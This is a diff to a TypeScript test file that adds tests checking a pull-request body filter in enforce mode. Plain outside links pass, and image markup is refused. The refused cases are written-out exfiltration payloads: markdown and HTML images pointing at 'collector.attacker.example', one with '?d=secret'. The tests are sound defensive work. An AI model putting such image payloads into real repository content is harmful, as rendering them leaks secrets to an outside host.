@@ -67,7 +67,7 @@ function setup(commands: string[], { machine = true }: { machine?: boolean } = {
 	const spans: Span[] = [];
 	let open: number | null = null;
 	const run = {
-		targets: { tainted: false },
+		targets: { tainted: false, trusted: new Set() },
 		toolStarted: (server: string, tool: string, inputBytes: number) => {
 			spans.push({ server, tool, inputBytes, ended: null });
 			return String(spans.length - 1);
@@ -147,10 +147,31 @@ function setup(commands: string[], { machine = true }: { machine?: boolean } = {
 	};
 	/** The spans of the checks, without the one of the tool itself. */
 	const checkSpans = () => spans.filter((span) => span.tool === "check");
-	return { sandbox, settings, proposed, recorded, spans, checkSpans, tool, call, refused };
+	return { sandbox, settings, proposed, recorded, spans, checkSpans, tool, call, refused, run };
 }
 
 describe("a repository without checks", () => {
+	it("sends a body with an outside link to the configured repository in enforce mode", async () => {
+		const { run, call, proposed } = setup([]);
+		run.targets.tainted = true;
+		run.targets.mode = "enforce";
+		const body = "See https://elsewhere.example";
+		await call({ title: "Fix the cart", body });
+		expect(proposed[0]?.body).toContain(body);
+	});
+	it.each([
+		"![chart](https://collector.attacker.example/?d=secret)",
+		'<img alt="" src="https://collector.attacker.example/p.png">',
+		"![chart][1]\n\n[1]: https://collector.attacker.example/p.png",
+	])("refuses an image the repository's page would fetch, in enforce mode: %s", async (body) => {
+		const { run, call, proposed } = setup([]);
+		run.targets.tainted = true;
+		run.targets.mode = "enforce";
+		await expect(call({ title: "Fix the cart", body })).rejects.toThrow(
+			"collector.attacker.example",
+		);
+		expect(proposed).toEqual([]);
+	});
 	it("R1: is proposed as before: one commit and push, the disclosed body and nothing about checks", async () => {
 		const { sandbox, proposed, recorded, spans, call } = setup([]);
 		const outcome = await call();
